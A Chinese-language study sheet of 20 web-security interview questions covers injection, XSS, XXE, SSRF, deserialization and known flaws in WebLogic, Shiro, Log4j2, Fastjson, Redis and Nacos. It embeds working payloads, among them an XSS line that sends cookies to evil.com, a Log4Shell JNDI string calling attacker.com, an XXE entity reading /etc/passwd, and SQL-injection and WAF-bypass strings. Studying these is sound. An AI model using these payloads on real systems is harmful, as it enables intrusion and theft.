# Web安全面试要点：20 题速记（合规自用）
最后更新：2025-09-29
来源：个人学习笔记（课程作业与面试复习），仅限授权与教学环境，切勿用于未授权测试。

---

## 1、OWASP Top 10 包含哪些漏洞？
- 1. 访问控制失效：越权、未校验权限、资源暴露。
- 2. 加密机制失效：未加密传输、弱加密、敏感信息泄露。
- 3. 注入：SQL、NoSQL、命令、LDAP等。
- 4. 不安全设计：业务流程无安全约束，功能缺少安全考量。
- 5. 安全配置错误：默认配置、启用调试、暴露敏感信息。
- 6. 自带漏洞和过时组件：依赖库未及时更新。
- 7. 身份识别和认证错误：弱认证、暴力破解、会话管理不当。
- 8. 软件和数据完整性故障：反序列化、CI/CD被篡改、供应链依赖被污染。
- 9. 安全日志和监控故障：日志不全、监控不到、攻击难追踪。
- 10. 服务端请求伪造（SSRF）：服务器被诱导访问内网或外部资源。

---

## 2、SQL 注入报错注入，有哪些常用函数？
- 利用数据库报错，将敏感信息带出。
- 典型函数：
  - `updatexml()`: updatexml(1, concat('~',(SELECT database()),'~'),1)
  - `extractvalue()`: extractvalue(1, concat('~',(SELECT user()),'~'))
  - `floor()+rand()+group by`: 经典双查询报错，带出数据。
  - `exp()`: 利用大数溢出，exp(~(select*from(select user())a))
  - `st_latfromgeojson()`: MySQL 5.7+，借助GeoJSON解析报错。
- 场景：注入点回显报错内容时，选用上述函数构造payload。

---

## 3、SQL 注入漏洞的利用，有哪些绕过 WAF 的方法？
- 注释绕过：`/**/`, `/*!50000select*/`, `-- -`, `#`
- 编码绕过：URL编码、十六进制、Unicode、Base64
- 关键字变形：`SeLeCt`, `UnIoN`, `or`→`||`, `and`→`&&`
- 特殊符号/函数：`+`, `-`, `~`, `like`, `mid()`, `substr()`
- 空白符替换：`%09`(Tab), `%0a`(换行), `%0d`(回车)
- 多参数绕过：POST Body参数隐蔽注入
- 分块传输：`Transfer-Encoding: chunked`，绕过长度检查
- 数据溢出：超长payload致WAF失效
- 等价替换：`sleep()`→`benchmark()`
- 协议层绕过：HTTP参数污染

---

## 4、SQL 注入宽字节注入，原理和手法。
- 原理：利用GBK等宽字符集，转义字符`\`与特殊字节（如`%df`）组合成双字节汉字，吃掉转义符，成功闭合单引号。
- 手法：输入`%df'`，经转义变`%df%5c`，数据库按GBK解析为汉字，后续SQL语句继续注入。
- 例子：`id=%df%27%20union%20select%201,2,3%23`

---

## 5、说一下，CSRF 和 SSRF 的区别。
- CSRF：跨站请求伪造，诱导用户在已登录状态下向目标站点发起操作（如转账）。
- SSRF：服务端请求伪造，攻击者诱导服务器去请求攻击者指定的链接，可用于内网探测、读取敏感信息。
- 对比：CSRF利用用户身份，SSRF利用服务器网络权限。

---

## 6、什么是 XSS 盲打
- 盲XSS：注入点不可直接反射执行，只有后台（如管理员）查看日志/反馈时才触发XSS。
- 典型场景：留言板、日志、订单详情等，攻击者需等待后台人员访问页面后收到回连。

---

## 7、利用 XSS 漏洞如何获取数据？
- 目标：Cookie（非HttpOnly）、localStorage/sessionStorage、页面DOM、用户输入、API数据。
- 手法：
  - `<script>new Image().src='http://evil.com/?c='+document.cookie</script>`
  - 监听键盘输入，伪造钓鱼表单，重定向跳转，利用Ajax获取并外带数据。
  - DNS请求外带（如将敏感信息拼为子域名）。
- 防御：输出编码、CSP、安全Cookie、敏感数据最小化前端暴露。

---

## 8、文件上传漏洞的绕过方式有哪些？
- 前端校验绕过：抓包改后缀或Content-Type
- 黑名单绕过：特殊后缀（.php5/.phtml）、大小写（.PhP）、末尾加点（shell.php.）、双写（shell.pphphp）、上传.htaccess
- 白名单绕过：IIS/nginx解析漏洞、00截断（shell.jpg%00.php）
- 内容校验绕过：在文件头插入图片魔数字节（如GIF89a），图片马
- 竞争条件：上传后瞬间访问，利用删除延迟

---

## 9、什么是 XXE 漏洞，有哪些利用方法？
- XXE：XML外部实体注入，利用应用解析XML时未禁用外部实体，加载攻击者构造的实体。
- 利用：
  - 读取本地文件：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`
  - SSRF：`<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">`
  - 命令执行：如`expect://id`
  - DoS：递归实体消耗资源
  - 盲XXE：外部DTD带数据回连

---

## 10、反序列化漏洞的基本原理。
- 原理：应用反序列化用户可控数据，未做安全校验，攻击者利用“魔法方法”（如`__wakeup()`, `__destruct()`，Java的`readObject()`），实现代码执行或敏感操作。
- 常见：PHP、Java、Python等语言对象反序列化，框架/组件易中招。

---

## 11、讲一下 SSRF 的基本原理？可利用的协议有哪些？
- SSRF：攻击者让服务器主动请求任意地址，内网探测、绕过防火墙/认证。
- 可利用协议：
  1. http/https：访问内网web服务
  2. file：读取本地文件
  3. gopher：构造任意TCP数据包，打Redis/MySQL
  4. dict/ftp/ldap/tftp：各类服务探测或利用

---

## 12、说下业务逻辑漏洞有哪些类型？
- 权限相关：水平越权（访问他人数据）、垂直越权（低角色操作高权限功能）
- 认证相关：弱密码、密码重置缺陷、验证码可爆破、邮箱可篡改
- 流程相关：金额/库存篡改、跳过关键流程、条件竞争（抢购、优惠券）
- 数据相关：批量枚举用户信息、篡改包状态码

---

## 13、Weblogic 有什么可利用的漏洞？
- 反序列化漏洞：T3/IIOP协议（CVE-2015-4852/2018-2628/2019-2725/2020-2551）
- SSRF漏洞：UDDI组件（CVE-2014-4210）
- 未授权访问：console弱口令、后台未授权
- RCE漏洞：console组件未授权远程代码执行（CVE-2020-14882/14883）

---

## 14、什么是 T3 协议，有什么作用，有什么特征？
- 作用：Weblogic专用高性能RMI协议，客户端与服务器、集群间传输序列化对象。
- 特征：
  - 数据包头`t3 12.2.1`或`HELO`
  - Java对象序列化体
  - 默认端口7001
- 与漏洞关系：T3协议传输序列化数据，易触发反序列化漏洞

---

## 15、Apache Shiro 有什么漏洞，550 和 721 有什么区别？
- Shiro主要漏洞：身份认证绕过与反序列化RCE
- Shiro-550（CVE-2016-4437）：RememberMe密钥硬编码，攻击者可伪造cookie，低难度RCE（影响1.2.4及以下）
- Shiro-721（CVE-2019-12422）：密钥可配置但若泄露可Padding Oracle攻击，难度大于550
- 区别：550只要默认密钥，721需已知密钥和Padding Oracle链

---

## 16、log4j2 有什么漏洞？攻击特征是什么？
- Log4Shell（CVE-2021-44228）：JNDI注入，日志字符串中`${jndi:ldap://...}`触发远程代码加载执行。
- 攻击特征：所有能被log4j2记录的输入点（如HTTP头、参数等）出现`${jndi:...}`，即有风险。
- 典型payload：`${jndi:ldap://attacker.com/x}`

---

## 17、Fastjson 反序列化漏洞，说一说。
- 原理：fastjson解析JSON字符串时，`@type`可指定任意类，利用autotype机制触发恶意类实例化。
- 典型漏洞：1.2.47及以下，黑名单绕过，利用TemplatesImpl等类实现命令执行。
- 防御：关闭autotype或配置黑名单。

---

## 18、针对 Redis 有什么利用方法？
- 未授权访问/弱口令情况下，可利用：
  1. 写Webshell：改配置dir/dbfilename，set内容，save
  2. 写SSH公钥：dir指向~/.ssh/，dbfilename设为authorized_keys
  3. 主从RCE：slaveof恶意服务器，module load注入.so文件
  4. 数据泄露：keys*，get key读取敏感信息
  5. Windows下写启动项
- 场景：攻击者可获取服务器权限或数据

---

## 19、Metinfo 有什么漏洞？
- Metinfo历史漏洞多，典型有：
  - SQL注入：如/member/index.php?lang=参数
  - 本地文件包含（LFI）
  - 文件上传：多处上传点，曾有绕过
  - 后台权限绕过：登录绕过
  - XSS：存储型和反射型
  - 代码执行：变量覆盖导致

---

## 20、NACOS 是什么？有什么漏洞？
- Nacos：阿里开源，服务发现、配置管理平台，微服务体系核心组件。
- 漏洞：
  1. 认证绕过（CVE-2021-29441）：添加User-Agent: Nacos-Server即可未授权访问
  2. Hessian反序列化漏洞：可RCE
- 危害：攻击者可管理所有服务配置，获取数据库等敏感信息

---

备注：本笔记仅作学习与面试复习，不包含操作步骤；任何测试均需在明确授权与隔离环境中进行。